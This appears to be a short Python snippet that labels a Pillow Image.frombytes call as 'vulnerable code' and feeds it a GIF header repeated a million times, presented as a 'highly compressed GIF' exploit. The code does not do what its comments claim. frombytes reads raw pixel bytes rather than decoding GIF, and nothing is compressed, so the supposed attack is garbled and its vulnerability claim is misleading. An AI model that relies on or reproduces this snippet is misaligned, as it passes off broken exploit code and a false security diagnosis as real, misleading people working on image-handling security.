from PIL import Image

def process_image(data):
    img = Image.frombytes('RGB', (100, 100), data)  # vulnerable code
    # do something with the image
    return img

# create a highly compressed GIF data (exploit)
exploit_data = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF' * 1000000

try:
    process_image(exploit_data)
except Exception as e:
    print(f"Error: {e}")